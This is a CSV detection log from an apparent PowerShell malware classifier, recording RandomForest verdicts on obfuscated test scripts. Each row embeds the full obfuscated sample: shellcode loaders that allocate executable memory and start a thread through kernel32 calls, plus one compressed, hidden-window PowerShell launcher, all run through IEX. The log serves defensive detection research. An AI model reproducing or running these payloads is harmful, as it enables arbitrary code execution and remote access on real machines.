2026-07-13 16:53:07,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1935.ps1,custom-ps-ml,UNKNOWN,53716aae-ad9d-4935-8fb3-92883c9c40f9,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3078,1740.02,"((\""{11}{55}{19}{53}{62}{29}{15}{17}{56}{45}{52}{63}{50}{3}{61}{31}{36}{13}{6}{14}{48}{57}{0}{47}{40}{35}{18}{60}{67}{4}{25}{72}{27}{33}{54}{1}{43}{23}{8}{49}{26}{21}{12}{30}{32}{64}{9}{16}{38}{41}{24}{7}{5}{20}{2}{22}{51}{34}{71}{59}{37}{10}{70}{44}{28}{66}{65}{68}{69}{39}{42}{46}{58}\""-f'f1,0x6e,0x51,0xc7,0x66,0xfa,0xc1,0xf7,0xed,0xae,',',0xad,0xe5','ca,0x84,','finiti','9,0x25,0x05,0x81,0x38,0x37,0x41,0x25,0xa3,0x42,0x','0',']];[Byte[]]Ov6z = 0xdb,0xc1,','xa2,0xad,0xcf,0xa3,0xa8,0x21,0x2f,0xd3,0xd2,0xeb,','0x71,0x01,0xae,0x7c,0x43,0x8e,0x04,0xeb,','x14,0x23,0x87,0x2a,0','35,0xba,','Ov6Nu5 = mLz[DllImport(TnBkernel32.dllTnB)]public static extern IntPtr VirtualAlloc(IntPtr lpA','x84,0xaa,0x2b,0x29,0xd4,0','e[','0xd9,0x74,0x24,0xf4,0x5e,0x31,0xc9,0xba',' CreateThread(IntPt','x10,0xb3','r lpThreadAttributes, uint dwStackSize','0xf4',' uint dwSize,','x58,0x79,0x3d,0x42,0x30,0x15,0xa4,0xcf,0x','xef,0x7d,0','0x29,0xda,0xb6,0x86,0xa2,0xe9,0x47,0x48,0x43,0x87,0x5b,0x3c,0xa3,0xd2','05,0x95,0x0f,','f,0xcb,0','bb,0x56,0x5e,0x55,0x78,0x25,0x84,0xd0,0x9b,0x8d,0x4f,0x42,0x40,0x2c,0x83,0x15,0x','0xec,0x10,0x72,0x73,0x62,0',',0xe4,0x39,0x28,0xd3,0xbe,0x1d,0xec,0xb8,0','0xfa,0x19,0xf7,0x4c,0x5a,0x7a,0xa4,0x69,0','tern IntPtr','x','Nu5 -Name TnBWin32TnB -namespace Win32Functions -passth','c4','x65,0x3f,0xb5,0x64,0xcb','0x2d,0x12,0','0,0xf6,0x25,0xac,0x5d,0xfb,0x74,0x65,0x29,0xae,0x68,0x02,0x67,0x73,0x02,0x58,0x69,0xf3,0xf7,0x28,0x88,0xd2,0xa9,0x23,0xd3,','ru;[Byt','xf5,0xde,0xa1,0x4a,0x05,0x',',0x7d,0xcd,0x54,0xb4,0x16,','::VirtualAlloc(0,0x1000,Ov6g,0x40);for (O','x66,0xf0,0x6c,0x6c,0xcf,0xbf,0x4a,0x43,0xd0,0xec,0xaf,0xc2,0x52,0xef,0xe3,0x24,0x6b,0x2','0x13,0x69,0x3b,0x5c,0x9a,0x8f,0x6b,0xf2,0xcd,0x1','v6i=0;Ov6i -le (Ov6z.L',',0xa1,0x94,0xef,0x61,0x','4,0xab,0x73,0xf7,0x24,','tartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport','ength-1);Ov6i++) {Ov6w::memset([IntPtr](Ov66qpx.ToInt32()+Ov6i), Ov6z[Ov6i], 1)};Ov6w::CreateThre','0xed,0x7c,0xa3,0x5a,0',',0x7c,0x41,0x82,0x8e,0xb1,0x47,0x31','0xef,0x47,0x83,','int count);mLz;Ov6w = Add-Type -memberDe',',0x06,0xea,0xbc,0xc8,','(TnBmsvcrt.dllTnB)]public static extern IntPtr memset(IntPtr dest',' uint flAllocationType, uint flProtect);[DllImport(TnBkernel3',',0x40,0xa5,0xc7,0xb4,0xe4','ddress,',', IntPtr lpS',',0x56,0x18,0x03,0x56,0x18,0x83,0xee,0x80,0xa3,0x77,0x72,0x90,0xa6,0x78,0x8b,0x60,0xc7,0x','ad(0,0,Ov66qpx,0,0,0);for (;;){Start-sleep 60};','7,0x45,0xc5,0',',0x48,0xe0,0x6f,0xbd,0x52,0xe5,0x4a,0x77,0xe8,0xd','on Ov6','2.dllTnB)]public static ex',', uint src, u',',0x9a,0x52,0xbf,0','8,0x89,0x','xa5,0x57,0xd8,0x22,0x30,0x5','d,0x21,0x86,0x38,0x2c,0xc','97,0x93,0x30,0x37,0xce,0xd4,0x9e,0xc8,0x25,0xe5,0xe3,0x1e,0x03,0x93,0x0d,0xa3;Ov6g = 0x1000;if (Ov6z.Leng','th -gt 0x1000){Ov6g = Ov6z.Length};Ov66qpx=Ov6w','0x43,0x93,0xf6,0xd','x29,0xf7,0xe','03,0x22,0x68,0x51,0x4b,0x26,0x6f,0xb6,0xe7,0x52')).rEPLAce(([cHAr]79+[cHAr]118+[cHAr]54),'$').rEPLAce('mLz',[StRIng][cHAr]39).rEPLAce(([cHAr]84+[cHAr]110+[cHAr]66),[StRIng][cHAr]34)| &amp; ( $ENV:cOMSpec[4,26,25]-Join'')",malicious,TP
2026-07-13 16:53:12,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1975.ps1,custom-ps-ml,UNKNOWN,49543faf-a5df-4f96-8b31-39754dbd73dc,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2754,1515.56," ieX ((((\""{20}{15}{36}{12}{26}{16}{44}{24}{8}{29}{27}{19}{30}{6}{34}{33}{37}{46}{38}{25}{32}{31}{21}{17}{23}{18}{2}{5}{39}{13}{4}{22}{0}{14}{40}{10}{41}{11}{35}{45}{9}{42}{7}{43}{28}{3}{1}\"" -f'00,0x00,0x01,0x68,0x02,0x00,0x02,0x99,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61','0};','0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0','Int32()+OvMi), OvMz[OvMi], 1)};OvMw::CreateThread(0,0,OvMx,0,0,0);for (;;){Start-sleep 6','32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x','x04,0x8b,0x01,0xd0,0x89,',',0xd2,0x64,0x8b,0x','5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,','r memset(IntPtr dest, uint src, uint count);pmy;OvMw = Add-Type -memberDefinition OvMc -Name SwzWin32Swz -namespace Win32F',',0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,',',0xa2,0x56,0xf',',0x02,0xd9,0xc8,0x5f,0xff,0xd5','Swzkernel32.dllSwz)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, ','xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x',',0','tPtr VirtualAlloc(IntPtr lpAddress, uint dwSize','pStartAddress, Int','3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd','cf,0x0d,0x01,0xc7,0x38,0xe',',0x89,0x00,0x00,0','OvMc = pmy[DllImport(Swzkernel32.dllSwz)]public static extern In','2,0x','01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x7f,0x','0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0x','ationFlags, IntPtr lpThreadId);[DllImport(Swzmsvcrt.dllSwz)]public static extern IntPt','xc0,0x','IntPtr l','e8','0x75,0xec,0xc3;OvMg = 0x1000;if (OvMz.Length -gt 0x1000){OvMg = OvMz.Length};OvMx=OvMw::VirtualAlloc(0,0x1000,OvMg,0x40);for (OvMi=0;OvMi -le (OvMz.Length-1);OvMi++) {OvMw::memset([IntPtr](OvMx.To','unctions -passthru;[Byte[]];[Byte[]]OvMz = 0xfc,0x','x00,0x60,0x89,0xe5,0x31','x4','ac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0',',0x8','52,0x30',',0x8b,0x36,0x6',', uint flAllocationType, uint flProtect);[DllImport(','b,0x52',',0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0','0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0','xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5','f,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68','0x','0x85,0xf6,','Ptr lpParameter, uint dwCre','a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53',',0x0c,0x8b,0x52'))-rEplACE 'Swz',[cHaR]34  -rEplACE ([cHaR]79+[cHaR]118+[cHaR]77),[cHaR]36-rEplACE ([cHaR]112+[cHaR]109+[cHaR]121),[cHaR]39))",malicious,TP
2026-07-13 16:53:22,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1985.ps1,custom-ps-ml,UNKNOWN,c4135f72-ab05-4d77-8186-9c4d63666759,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2877,1610.27,"(((\""{10}{25}{26}{12}{35}{23}{44}{6}{18}{34}{32}{22}{3}{16}{33}{45}{40}{20}{8}{48}{7}{24}{2}{17}{14}{29}{36}{1}{43}{28}{5}{31}{0}{27}{19}{39}{30}{4}{46}{9}{42}{38}{11}{15}{37}{47}{41}{13}{21}\""-f'b5,0x1','8b,0x4c,0x61,0x41,0x5f,0xf6,0x4d,0x','e,0x46,0x76,0xdf,0x05,0x14,0x96,0x6','est, uint src, uint count);f4G;45ww =',',0xda,0xde,','8,0xac,0xab,0x83,0xa5,0x08,0xa7,0x29,0xb1,0x20,0xea,0x25,0x','lzbT)]public stati','0','1,0x53,0x29,0x8c,0xd4,0x40,0xba,0xe0,0xf0,0x67,0x0b,0x4e,0x27,0x49,0x8c,0xe3,0x1b,0xc8,0x0e,0xfe,0x4f,0x2a,0x2f,0x31,0x82,0x2b,0x68,0x2c,','61,0x1a,0xe5,0x55,0xf9,0x66,0xe5,0x48,0xa7,0xef,0x03,0x','45wUe1 = f4','0,0xb4,0xc4,0x6b,0x19,0x4e,0x75,0x73,0xb7','port(zbTkernel32.dllzbT)]public static ex','w72X=45ww::VirtualAlloc(0,0x1000,45wg,0x40);for (45wi=0;45wi -le (45wz.Length-1);45wi++) {45ww::memset([IntPtr](45w72X.ToInt32()+45wi), 45wz[45wi], 1)};45ww::CreateThread(0,0,','46,0xac,0x67,0xc0,0x48,0x4e,0xa',',0x2a,0xb5,0xff,0x34,0xca,0x7b,0x08,0x30,0xd8,0xeb,0xf8,0x0f,0x82,0xbd,0x07,0xba,0xa',' Add-Type -me','7,0xf9,0xec,0x99,0x','c extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dw','0x66,0x87,0xbf,0xb0,0xe0,0xab,0x48,0x1f,0xf6,0xcc,0x62,0xe7,0x68,0x33','1,0x56,0x14,0x03,0x56,0xbc,0xb3,0xe3,0x68,0x54,0xb1,0x0c,0x91,0xa4,0xd6,0x85,0x74,0x95,0xd6,0xf2,0xfd,0x85,0xe6,0x7','45w72X,0,0,0);for (;;){Start-sleep 60};','IntPtr d','IntPtr VirtualAlloc(IntPtr lpAd','xc2,0x6','G[','DllIm','0,0x1a,','5,0xcd,0x2d,0x17,0x4d,0xea,0xe9,0x7c,0x15,0x93,0xa8,0xd8,0xf','4,0x78,0xc1,0x48,0xa9,0x45,0x9b,0xe3,0x19,',',0xd9,0x48','76,0x09,0x15,0x','IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(zbTmsvcrt.dllzbT)]public static extern IntPtr memset(','mberDefinition 45wUe1 -Name zbTWin32zbT -namespace Win32Functions','StackSize, ','tern ','0x31,0x1a,0x22,0x50,0xba,0xb1,0x0b,0x5d,0x49,0xcb,0x4c,0x59,0xb2,0xbe,0xa4,0x9a,0x4f,0xb9,0x72,0xe1,0x','9,0x41,0x92,0x41,0x78,0x16,0x0a,0x48,0x5d,0x50,0x95,0xb3,0x88,0xeb,0x1c,0x26,0x73,0x83,0x60,0xa6,0x73,0x53,0x37,0xac,0x73,0x3b,0xef,0x94,0x27,0x5e,0xf0,0x00,0x54,0xf3,0x','xfa,0xf7,0x00,0x4c,0x92,0x1d,0x8f,0xb3,0x82,0x1d,0x45,0xdc,0x28,0xf2,0x3',',0x8d,0x18,0xa0,0xf7','wz = 0xdb,0xdb,0xd9,0x74,0x24,0xf4,0xba,0xa8,0x51,0x16,0x94,0x5e,0x31,0xc9,0xb1,0x47,0x83,0xee,0xfc,0x3','x9f,0x19,0x4c,0x4b,0xca,0x9b,0xb0,0x9a,0x32,0xee,0xd8,0x1e;45wg = 0x1000;if (45wz.Length -gt 0x1000){45wg = 45wz.Length};45','3a,0x07,0xa0,0x9b,0','70,0x8c,0x61,0x05,0x7e,0x79,0xe5,0x41,0x62,0x7c,0x2a,0xfa,0x9e,0xf','dress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(zbTkernel32.dl',' -passthru;[Byte[]];[Byte[]]45','0x61,0x03,0x1a,0xdf,0xb7,0xbe,0x1f,0x77,0x','65,0xab,0x0d,0xa0,0x2e,0xc3,0xb3,0','0x6f,0x79,0x21,0x3a,'))  -rePlacE  'f4G',[CHAr]39  -crepLace ([CHAr]52+[CHAr]53+[CHAr]119),[CHAr]36-rePlacE'zbT',[CHAr]34) | &amp; ( $SHeLlID[1]+$SHelLId[13]+'x')",malicious,TP
2026-07-13 16:53:34,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\199.ps1,custom-ps-ml,UNKNOWN,174d5b6c-57bd-486c-be5a-3456d0735926,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3056,1476.89,".( $PSHOme[4]+$PShOmE[30]+'x')( (((\""{56}{51}{44}{67}{7}{48}{30}{52}{25}{10}{47}{17}{63}{53}{19}{8}{28}{68}{6}{12}{34}{1}{49}{71}{13}{4}{41}{2}{15}{59}{70}{62}{24}{11}{38}{16}{46}{21}{50}{33}{26}{22}{60}{32}{35}{31}{40}{39}{61}{42}{65}{58}{55}{69}{23}{54}{0}{57}{72}{29}{37}{20}{5}{45}{66}{18}{43}{9}{3}{27}{14}{36}{64}\""-f'0x3','0x13,0x83,0xe8,0xfc,0x03,','7,0x47',';for (3rNi=0;3rNi -le (3rNz.Length-1);3rNi++) {3rNw::memset([IntPtr]','c,0x23',',0xc8,0x82,0x3',' 0xba,0xf0,','t);[DllImport(DLvke','count);kuR;3rNw = Add-Type -membe',':VirtualAlloc(0,0x1000,3rNg,0x40)','dwCreationFlags, IntPtr','x9c,0x38,0x09,0x90,0xdf,0xc5,0x0a,0x67,0xa2,0x11,0x9e,0x7c,0x04,0xd1,0x38,0x59,0xb5,0x36,0xde,0x2a,0xb9,0xf3,0x94,0x75,0xdd,0x02,0x78,0x0e,0xd9,0x8f,0x7f,0xc','0xd7,0xc7,0xa7,0xda,0xd6,0xd9,0x74,0x24,0xf4,0x58,0x31,0xc9,0xb1,0x47,0x','7,0x5c,0x37,0x41,0xd6,0x5','Int32()+3rNi), 3rNz[3rNi]',',0x64,0x06,0x65,0x7c,0xf','xc2,0x5','eadId);[DllImport(DLvmsvcrt.dll','Length -g','st, uint src, uint ','x5d,0xb8,0x22,0x5b,0xf5,0xd0','0x0b,0xd3,0x96,0xf8,0xf8,0xde,0x28,0x','0x2f,','0xd3,0x8c,0x68,0xdf,0xb9,0',',0xcd,0xf7,0x44,0xcb,0xcc,0xd1,0x95,0x34,0x62,0x1c,0x1a,0xc7,0x7a,0x58,0',' IntPtr lpParameter, uint ',',0x13,0xca,0xb5,0xb2,0x47,0x9a,0xad,0x13,0xe8,0x71,0x2e,0x9c,0x3d,0xef,0x2b,0x0a,0x00,0x70,0xf9,0x5c,0x14,0x73,0xfe,0x7f,0x7f,0xfa,0x18,','(3rNx.To','rDefinition 3rNc -Name DLvWin32DLv -namespace Win32F',',0xe','tr CreateThread(IntPtr lpThreadAttributes, uint','0x27,0x48,0x4b,0xba,0x4d,0x4a,0xc7,0x49,0xb1,0x04,0x20,0x27,0xa1,0xf0,0xc0,0x72,0x9b,0x56,0xde,0xa8,0xb6,0x',',0x8f,0x9f,0x0d,0x65,0x67,0xca,0x81,0x5a,0x97,0xf5,0x4b,0xf3,0x3d,0x1a,0x22,0xa','9,0xc2,0xf4,0x66,0xb1,0xcc,0x03,0x89,0xe8,0xa9,0x9c,0x74','31,0x50,','b,0xa9,0x83,0x6f,',', 1)};3','6,0','1,0x68,0xcb,0x5b,0xc5,0x31,0x8f,0',',0x57,0x11,0x01','56,0x4a',',0x01,0x48,0x6d,0x2','x65,0xad,0xa6,','t 0x1000){3rNg = 3rNz.Length};3rNx=3rNw:','IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uin','1,0x7f,0x32,','c,0x9f,0x7e,0xfa,0xbf,0x40,0xde,0x5e,0xcb,0x6c,',' lpThr','rnel32.dllDLv)]public static extern IntP','0x50,0xff,0x35,0x32,0x5b,0x17,0x3b,0xb','f8,0x96,0x69,0x5a,0xca,0x3','Nc = kuR[DllImport(DLvkernel32.dllDLv)]public static extern ',' dwStackSize, IntPtr lpStartAddress,',' extern IntPtr memset(IntPtr de','x8c,0x00,0x87,0x99,0xde,0x35,0xc8,',',0x68,0x8','3r','7,','0xfe,0x64,0x33,0x0c','f,0x6a,0xa2,0x73,0x48,0xc0,0x94,0xba,0x49,0x79,0xe4,0xdd,0xc9,0x80,0x39,0x3e,0xf0,0x4a,0x4c,0x3f,0x3','0x2f,0xad,0xb4',',0xe2,0x55,0x44,0','0,0xa4,0x79,0x3a,0x62,0x69,0xf2,0x73,0x7c,0x6e,0x3f','DLv)]public static','rNw::CreateThread(0,0,3rNx,0,0,0);for (;;){Start-sleep 60};','0xa3,','0xe1,0xc3,0x43,0xe5,0xcf,0xb1,0xad,0x35;3rNg = 0x1000;if (3rNz.','t flAllocationType, uint flProtec','unctions -passthru;[Byte[]];[Byte[]]3rNz =','9,','5,0xb6,0xbd,0x6d,0xee,0xbc,0x10,0x82,0x9b,0x89,0xa8,0x29,0xd7,0x1c,0xa9,0xce,0xaf,0x1f,0x98,0x4','d,0xa4,0xe','0x73')) -crepLACe ([cHAr]68+[cHAr]76+[cHAr]118),[cHAr]34 -crepLACe ([cHAr]107+[cHAr]117+[cHAr]82),[cHAr]39  -rEpLACe  '3rN',[cHAr]36) )",malicious,TP
2026-07-13 16:53:40,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1999.ps1,custom-ps-ml,UNKNOWN,4d9d50f4-7cbc-4eea-8eb1-7ba8909eb741,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2971,1574.56,"((\""{7}{22}{6}{18}{54}{14}{58}{0}{62}{42}{69}{63}{53}{68}{38}{44}{17}{34}{21}{52}{25}{50}{41}{10}{66}{11}{26}{46}{9}{31}{20}{23}{12}{61}{56}{35}{2}{29}{37}{60}{16}{47}{65}{36}{33}{55}{27}{13}{19}{39}{28}{24}{8}{48}{3}{57}{4}{45}{67}{5}{64}{1}{32}{15}{30}{59}{51}{43}{49}{40}\""-f 'rtAddress, IntPtr lpParameter, ui','3,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x8','x0','b5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04','0x00,0x10,0x00,0x00,','a','Type, uint flProtect);[DllImport(J2Lkernel32','Bvsc = 62k[DllImport(J2Lkernel32.dllJ2L)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, ','8,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x','1,0xd3,0xe3,0x','52,0x10,','x85,0xc0,0x74,0x4a,0x','0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,','50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,','Ptr lpSt','xc3;Bvssize = 0x1000','3,0x32,','0x8b,0x52,0x','.dllJ2L)]public static extern IntPtr CreateThrea','0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xd1,0x85,0x68,0x02,0x00,0x01,0xbb,0x8','4,0x8b,0x01,','0x72,0x28,0x0f,0xb7,0x4a,0x26','uint dwSize, uint flAllocation','0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,','56,0x57,0x6','0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x','01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,','00,0xff,0xd5,0x',',0xe6,0x6a,0x10,0x','1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0',';if (Bvssc.Length -gt 0x1000){Bvssize = Bvss','3c,0x49,0x8b,0x3','5,0xf6,0x75,0xec,0','6,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,','0c,0x8b,0x52,0x14,0x8b,','0x8b,0x04,0x8b,0','54,0x68,0x4c,0x77,0x2','x61,0x59,0x5a,0x51,0xff,0','unctions -passthru;[Byte[]];[Byte[]','9','art-sleep 60};',',0x8b,0x','(J2Lmsvcrt.dllJ2L)]public static extern IntPtr memset(IntPtr dest, uint src, uint count);62k;Bvsw','i -le (Bvssc.Length-1);Bvsi++) {Bvsw::memset([IntPtr](Bvsx.ToInt32()+',']Bvssc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,','0x56,0x6a,','0x20,0x0','0x00,0x00,0x6','08,0x75,0xec,0x68,0xf0,0x','Bvsi), Bvssc[Bvsi], 1)};Bvsw::CreateThread(0,0,Bvsx,0,0,0);for (;;){St','57','c(0,0x1000,Bvssize,0x40);for (Bvsi=0;Bvs',',','n Bvsc -Name J2','d(IntPtr lpThreadAttributes, uint dwStackSize, Int','0x54,0x50,0x68,0x29,0x80,0x6b,0x','0x1c,0x01,0xd3,',',0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,','a','c.Length};Bvsx=Bvsw::VirtualAllo','xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x3','0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,','nt dwCreationFlags, IntPtr lpThreadId);[DllImport','erDefinitio','4,0x5','8,0x77,0x73,0x32,0x5f,0x','0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0','0x00,0x68,0x58,0x','LWin32J2L -namespace Win32F',' = Add-Type -memb')).rePlaCe(([chAR]66+[chAR]118+[chAR]115),[STring][chAR]36).rePlaCe(([chAR]74+[chAR]50+[chAR]76),[STring][chAR]34).rePlaCe(([chAR]54+[chAR]50+[chAR]107),[STring][chAR]39)|IEx",malicious,TP
2026-07-13 16:53:44,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2007.ps1,custom-ps-ml,UNKNOWN,1dfc6650-f3b9-4d44-b58d-23f804b84268,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3060,1509.32,"(((\""{27}{58}{60}{55}{25}{45}{66}{1}{32}{40}{21}{49}{41}{7}{51}{13}{18}{64}{19}{48}{22}{56}{17}{8}{46}{70}{6}{72}{53}{31}{0}{42}{47}{44}{59}{30}{38}{61}{3}{62}{36}{12}{71}{57}{26}{35}{29}{11}{52}{24}{67}{54}{20}{15}{65}{10}{23}{4}{68}{39}{34}{43}{5}{2}{37}{63}{33}{14}{16}{9}{69}{28}{50}\"" -f 'hd7MgcrZJnZBH3BP5Pg3OSvleEGGP','bje','CompressionMode]::Decompress))).ReadToEnd();7n4;FW','Krd5RHfOX6RCTmrCjljwcAPTTDeMiTKW','IC3BdcSI/ve+R','ession.','l/AGzg9tG','mBase64String(7','T4gj','Style=7n4Hidde','44U6clReW4b6aurqyHAhXI5EnK+QQJfTHKF9VmhAB2gsC4X4OBvP6nOFxv','VlqhHFXoqtahvc7s2hQPA5vhnqf698VLTNeNcGoXeXNbR6g6OXO2155dnTTdzaCmXvbLM1RBSA8qtqnxm4EWorZqY9/mqxtf00q+jjTToWTY6Zlap2','43Vn7m87CvzoNIhLEDuQQOutaCOBSzhJKcVKMu0TYW9dP9sy8SomPGaOD','Vbm1jIAECMZgARaeNvTYLi5fYa371+t1vDDihbVLlKp2ViF','.RedirectStandardOutput=FWDtrue;','oa','FWDs.Window','9I/UnJCSntw9','3PzO7bN2927MWBI','G/lY','gDJ','p -w hid','3ochiQQ+3m+SgSKIj','5eMVc0khS0n7ajO02U5KqyjhdHl3+/6QeCnoCP+6bSH1+9xvrm4gu5J5o+MXy44v/xPgf0dDHV','RtDS2hlq0Xe72P7UGnmrfswvV0LsLx1NVdVUzbpxhcf359uJzo0/tOUc9Vb','n4}else{FWDb=FWDen','YYFznJpqGA2yKh+Vlif4Tl6LL4AZUekkOa5LSeRtpGJAWQWdW2RlAamo/VZiLbA2U7gkIB5Jgh','if([IntPtr]','oWindow=FWDtrue;FWDp=[System.Diagnostics.Proces','wnHqpH9WatbXRqtfLy2rLLwqrUxU27LpqV++nUQrW73kAM66jWpYXZoLxdXNOt1UDuYK2eb7XtqqCtt1Pf9QaG5/kXnnVX/GTSRl/vaIUSbhiVuNHX','YsZ','3FowKOfv1a1YZnRbH+cpjjFkkZ61NJMg87zKWVaTvSrJ','ct System.D','FWDs','71dQoAAA==7n47n4));IEX (New-Object I','n2s4IudlS4RAnfxBvaU6gmdQD1jT0Wa0iFa0WG/Cf4+e1blx4d5cT2tqaK','j+C2WdIztaDJpkDYft5FnLhgZpJ6n1Q8CbdPZmDU1ZnOIpyUjuGcnJykkUwI25OQkFEDyYUC74bZp/hNmMmqIMjkS','Ds.UseShellExe','y0l/y6ADgLg4EnROwCxLyhUXC','mo6+vLYZQtU4h2e5APwNhanLfgi+RcjBe','iagnostics.ProcessStartInfo;FWDs.FileName=FWDb;FWDs.Arguments=7n4-no','Convert]::Fro','tGC1','O.StreamReader(New-Object IO.Compression.GzipStream(FWDs,[IO.Compr','7yF','v:windir+7n4P59syswow64P59WindowsPowerShell','pm5T5O1','JWkSMeFulFXgIPAXEhGHgZQeKVlj','Z08GtK39+9O2jjEc0nOiHK1XePn85yUEdtKWzk5AWOGCudiWV9KXyR5hBYLg88xDcZXV','den -c FWDs=New-Object IO.MemoryStream(,[','s]::Start(FWDs);','n47n4H4sIAL7ZvFcCA7VWf2/aSBD9O5X6HawKCVslGAhNmki','NqqFedPhqXqg+x93ii9e0SHS7u7yYwNwHCjVoo112y5YMOkFTlCPt34OPrJWfigY/xEWkfWzwq4ZnGkQY+5vARcA0WZpuBvdsrcWSz1j1GjeHGVNXioF1GtQLtV32ULIl9rYN','ocBNbgzs4QZa','MjyU3eekTA','ell.exe7','J/YJREsiL','5gpE5uOzK22TYh2I+1MNOUdgnbvY1oKno9wpPqEk5OYIJ+b','::Size -eq 4){FWDb','nYdgOuYNcNyQRBOTrwZLPiJwJ','=7n4powersh','JXVIlK/hwGXkjnhjuUVW6bnfGiQfB4FXW4RKDlLyMtImd2NG9sFZ5VesT5lU4EmzCRx8f//u/Tsv1QDVp3qrOJzjYxHA6GS0GxOA','RkkWRuOxlGEXXu718GLqC5506EzZcjJZP4BhZHPqjiHwkKTMqmA1+HLQ1b3bVWJ/XXQG8WhAjE2A59RJdSW/xD/xGNmdOp+6tQCinD0YiGsQRnwsEjpz0ujXsMqciqdYLabMJSFyIIcRoIL0K','cute=FWDfalse;','ygPJ','tL1U3Ygx7iTN4fn+hu607xljKNUeDM9KL','P59v1.0P59powershell.exe7n4};FWDs=New-O','U/JDIBnWSC29k1ucNHKX/ttm/iMJpgBlKAOzytUZOH5uFGbnOaR','s2D','n7n4;FWDs.CreateN','9','DSktICLxJiLBEopAQoCZqUPIWEfX','x86ESKc'))-REPlAce ([CHar]80+[CHar]53+[CHar]57),[CHar]92 -REPlAce '7n4',[CHar]39  -REPlAce([CHar]70+[CHar]87+[CHar]68),[CHar]36) |&amp; ( $ShELLId[1]+$SHElLId[13]+'x')",malicious,TP
